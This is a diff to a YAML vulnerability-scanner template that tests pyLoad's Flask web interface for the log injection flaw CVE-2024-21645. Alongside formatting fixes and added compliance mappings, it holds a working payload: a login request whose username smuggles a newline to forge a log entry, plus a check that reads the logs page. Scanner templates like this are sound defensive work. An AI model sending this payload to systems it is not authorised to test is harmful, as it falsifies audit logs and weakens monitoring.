@@ -1,7 +1,7 @@
 id: PYLOAD_LOG_INJECTION
 info:
   name: "Pyload Flask Log Injection"
-  description: "This test refers to a vulnerability in Pyload's Flask application where malicious inputs can be injected into the application's log files. This can occur if the application fails to properly sanitize log inputs, allowing attackers to manipulate log entries or execute arbitrary code. Exploiting this flaw can lead to information disclosure or further security breaches." 
+  description: "This test refers to a vulnerability in Pyload's Flask application where malicious inputs can be injected into the application's log files. This can occur if the application fails to properly sanitize log inputs, allowing attackers to manipulate log entries or execute arbitrary code. Exploiting this flaw can lead to information disclosure or further security breaches."
   details: "This vulnerability arises when the Flask-based Pyload application inadequately sanitizes user inputs before logging them. This lack of proper input validation can let attackers inject malicious data into log files, which may result in the execution of arbitrary code or the disclosure of sensitive information. Such log manipulation can compromise the application's integrity and security."
   impact: "The impact of this vulnerability includes potential arbitrary code execution and information disclosure. Attackers can exploit this flaw to inject malicious payloads into log files, which may lead to system compromise or unauthorized access to sensitive data. Additionally, manipulated logs can disrupt monitoring and analysis processes, further jeopardizing system security."
   category:
@@ -24,8 +24,45 @@ info:
     - CVE-2024-21645
 attributes:
   nature: INTRUSIVE
-  plan: PRO
+  plan: FREE
   duration: FAST
+compliance_standards:
+  GDPR:
+    - Article 32
+    - Article 25
+  HIPAA:
+    - 45 CFR § 164.312(c)(1)
+    - 45 CFR § 164.308(a)(1)(ii)(A)
+  SOC 2:
+    - System and Communication Security
+    - Secure Application Development Controls
+  PCI DSS:
+    - Requirement 6.5.1
+    - Requirement 11.3
+  ISO 27001:
+    - A.12.6.1
+    - A.14.2.5
+  NIST 800-53:
+    - SI-10
+    - SI-3
+  CSA CCM:
+    - APP-02
+    - TVM-03
+  CIS Controls:
+    - IG1 Safeguard 16.2
+    - IG2 Safeguard 18.3
+  FedRAMP:
+    - SI-10
+    - CA-7
+  NIST 800-171:
+    - 3.14.1
+    - 3.14.2
+  FISMA:
+    - SI-10
+    - SI-3
+  Cybersecurity Maturity Model Certification (CMMC):
+    - SI.2.216
+    - RA.3.141
 api_selection_filters:
   response_code:
     gte: 200
@@ -37,7 +74,7 @@ api_selection_filters:
       gt: 0
     not_contains:
       - Error
-      - Internal Server 
+      - Internal Server
       - Failed
       - Unauthorized
       - access denied
@@ -80,41 +117,39 @@ api_selection_filters:
             extract: passKey
           value:
             extract: passVal
-  url:
-    extract: urlVar
   request_headers:
     for_one:
       key:
         eq: content-type
-        extract: contentTypeHeader  
+        extract: contentTypeHeader
 execute:
   type: multiple
   requests:
-  - req: 
-    - modify_method: POST
-    - modify_url: ${urlVar}?next=${urlVar}
-    - follow_redirect: true
-    - modify_header:
-        contentTypeHeader: "application/x-www-form-urlencoded"
-    - replace_body: !!str do=login&username=abcdef\'%0a[1970-01-01 00:00:00]  INJECTED               abcd  THIS ENTRY HAS BEEN INJECTED&password=wrong&submit=Login
-    - validate:
-        response_payload:
-          length:
-            gt: 0
-    - success: x2
-    - failure: exit
-  - req:
-    - modify_method: POST
-    - modify_url: ${urlVar}?next=${urlVar}/logs
-    - follow_redirect: true
-    - modify_header:
-        contentTypeHeader: "application/x-www-form-urlencoded"
-    - replace_body: 'do=login&username=${userVal}&password=${passVal}&submit=Login'  
-    - validate:
-        response_payload:
-          contains_all:
-            - "<td>1970-01-01 00:00:00</td><td class=\"loglevel\">INJECTED</td><td class=\"logsource\">abcd</td><td>THIS&nbsp;ENTRY&nbsp;HAS&nbsp;BEEN&nbsp;INJECTED&#39;</td>"
-        response_code:
-          eq: 200
-    - success: vulnerable
-    - failure: exit
+    - req:
+        - modify_method: POST
+        - modify_url: ${urlVar}?next=${urlVar}
+        - follow_redirect: true
+        - modify_header:
+            contentTypeHeader: "application/x-www-form-urlencoded"
+        - replace_body: !!str do=login&username=abcdef\'%0a[1970-01-01 00:00:00]  INJECTED               abcd  THIS ENTRY HAS BEEN INJECTED&password=wrong&submit=Login
+        - validate:
+            response_payload:
+              length:
+                gt: 0
+        - success: x2
+        - failure: exit
+    - req:
+        - modify_method: POST
+        - modify_url: ${urlVar}?next=${urlVar}/logs
+        - follow_redirect: true
+        - modify_header:
+            contentTypeHeader: "application/x-www-form-urlencoded"
+        - replace_body: 'do=login&username=${userVal}&password=${passVal}&submit=Login'
+        - validate:
+            response_payload:
+              contains_all:
+                - "<td>1970-01-01 00:00:00</td><td class=\"loglevel\">INJECTED</td><td class=\"logsource\">abcd</td><td>THIS&nbsp;ENTRY&nbsp;HAS&nbsp;BEEN&nbsp;INJECTED&#39;</td>"
+            response_code:
+              eq: 200
+        - success: vulnerable
+        - failure: exit
